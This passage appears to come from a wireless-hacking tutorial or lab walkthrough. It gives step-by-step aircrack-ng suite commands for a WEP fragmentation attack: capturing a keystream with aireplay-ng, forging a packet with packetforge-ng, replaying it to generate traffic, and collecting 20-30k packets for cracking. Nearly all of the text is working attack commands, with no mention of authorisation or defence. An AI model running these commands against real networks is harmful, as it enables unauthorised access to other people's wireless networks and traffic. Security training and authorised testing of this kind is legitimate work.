> If we are not able to fake auth then we can try a fragmentation attack:

```
sudo aireplay-ng -5 -b <bssid> -h <station> wlan0mon
```

> We need to wait to capture the keystream file which we will see when it asks us to "use this packet?" and we can click "y" and now we can run packetforge:

```
sudo packetforge-ng -0 -a <bssid> -h <station> -k 255.255.255.255 -l 255.255.255.255 -y <.xorfile> -w forged_packet
```

> Once the forged packet is created we can replay it to generate traffic:

```
sudo aireplay-ng -2 -r forged_packet wlan0mon
```

It will ask us to replay with 'y' then we can watch the data packets increase. We want to wait for around 20-30k packets then we can stop Aireplay and Airodump with CTRL + C and move onto the cracking step with the cap file.